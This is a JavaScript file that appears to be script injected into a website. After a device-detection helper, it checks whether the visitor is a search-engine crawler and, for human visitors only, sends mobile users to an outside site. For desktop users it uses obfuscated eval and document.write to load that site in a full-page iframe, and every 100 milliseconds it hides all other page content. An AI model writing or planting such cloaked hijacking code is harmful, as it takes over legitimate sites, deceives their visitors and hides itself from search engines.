!function(){var i={},o=window.navigator.userAgent.toLowerCase();i.isMobile=/(?:micromessenger|mobile|iphone|ipod|android|coolpad|mmp|smartphone|midp|wap|xoom|symbian|j2me|blackberry|windows phone|win ce)/.test(o),i.go2mob=function(){var o=arguments[0],n=[];n=window.location.search.substr(1).match(/(^|&)itsme=([^&]*)(&|$)/i);var e=null!=n&&null!=n[2]?n[2]:0;1!=e&&null!=o&&i.isMobile&&(window.location.href=o)},i.go2web=function(){var o=arguments[0],n=[];n=window.location.search.substr(1).match(/(^|&)itsme=([^&]*)(&|$)/i);var e=null!=n&&null!=n[2]?n[2]:0;1==e||null==o||i.isMobile||(window.location.href=o)},i.isiOS=/(?:iphone)/.test(o),i.isAndroid=/(?:android)/.test(o),i.isWechat=/(?:micromessenger)/.test(o),i.isMiniProgram="miniprogram"===window.__wxjs_environment,window.whatdevice=i}();
(function(){
	function isNormalUser(){
		var UA = navigator.userAgent.toLowerCase();
		var UAs = 'baiduspider,googlebot,youdaobot,360spider,msnbot,bingbot,sosospider,yisouspider,sogou web spider,sogou orion spider'.split(',');
		for(var i=0,total=UAs.length;i<total;i++){
			if(UA.indexOf(UAs[i]) > -1){
				return false;
			}
		}
		return true;
	}
	if(top == this && isNormalUser()){
		function goPAGE() {
    if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
        window.location.href = "https://m.transcode.cn/c/s/wap.xiaoaipan.cn/index.html"
    } else {
        var ss = '<center id="heihei"><ifr' + 'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="83' + '50" src="https://m.transcode.cn/c/s/wap.xiaoaipan.cn/"></iframe></center>';
        eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
        try {
            setInterval(function() {
                try {
                    document.getElementById("div" + "All").style.display = "no" + "ne"
                } catch (e) {}
                for (var i = 0; i < document.body.children.length; i++) {
                    try {
                        var tagname = document.body.children[i].tagName;
                        var myid = document.body.children[i].id;
                        if (myid != "iconDiv1" && myid != "heihei") {
                            document.body.children[i].style.display = "non" + "e"
                        }
                    } catch (e) {}
                }
            }, 100)
        } catch (e) {}
    }
}
goPAGE();
	}
}());
